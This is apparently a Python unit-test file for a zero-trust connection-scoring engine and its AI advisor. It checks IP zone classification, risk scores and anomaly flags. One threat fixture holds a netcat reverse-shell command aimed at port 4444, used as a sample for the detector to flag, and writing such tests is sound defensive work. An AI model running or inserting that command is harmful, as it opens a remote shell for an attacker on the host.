#!/usr/bin/env python3
import unittest
import zero_trust_engine as zte
import ai_advisor as aia

class TestZeroTrustEngine(unittest.TestCase):
    def test_zone_classification(self):
        zone, desc = zte.classify_network_zone("127.0.0.1")
        self.assertIn("LOOPBACK", zone)

        zone, desc = zte.classify_network_zone("192.168.1.100")
        self.assertIn("LAN_PRIVATE", zone)

        zone, desc = zte.classify_network_zone("142.250.190.46", hostname="1e100.net")
        self.assertIn("TRUSTED_INFRA", zone)

        zone, desc = zte.classify_network_zone("185.190.140.2", hostname="unknown.host")
        self.assertIn("PUBLIC_INTERNET", zone)

    def test_zero_trust_scoring(self):
        # 1. Normal local traffic
        conn_safe = {
            "name": "chrome",
            "exe": "/usr/bin/google-chrome",
            "cmdline": "chrome --type=utility",
            "remote_ip": "142.250.190.46",
            "remote_port": 443,
            "hostname": "google.com",
            "status": "ACTIVE",
            "first_seen": 100,
            "last_seen": 200,
        }
        eval_safe = zte.evaluate_zero_trust(conn_safe)
        self.assertGreaterEqual(eval_safe["score"], 80)
        self.assertEqual(eval_safe["risk_level"], "SAFE")

        # 2. Suspicious reverse shell / high-risk port in /tmp
        conn_threat = {
            "name": "nc",
            "exe": "/tmp/reverse_shell",
            "cmdline": "nc -e /bin/bash 185.190.140.2 4444",
            "remote_ip": "185.190.140.2",
            "remote_port": 4444,
            "hostname": "",
            "status": "ACTIVE",
            "first_seen": 100,
            "last_seen": 101,
        }
        eval_threat = zte.evaluate_zero_trust(conn_threat)
        self.assertLess(eval_threat["score"], 40)
        self.assertIn("SUSPICIOUS_EXEC_DIR", eval_threat["anomalies"])
        self.assertIn("HIGH_RISK_PORT_4444", eval_threat["anomalies"])

    def test_ai_advisor_explanation_offline(self):
        conn = {
            "name": "spotify",
            "exe": "/usr/bin/spotify",
            "remote_ip": "35.186.224.25",
            "remote_port": 443,
            "hostname": "audio-ak.spotify.com",
            "geo": "United States",
            "direction": "OUTBOUND",
            "status": "ACTIVE",
            "first_seen": 10,
            "last_seen": 60,
        }
        exp = aia.advisor._heuristic_explanation(conn, zte.evaluate_zero_trust(conn))
        self.assertIn("spotify", exp.lower())
        self.assertTrue(len(exp) > 20)

if __name__ == "__main__":
    unittest.main()
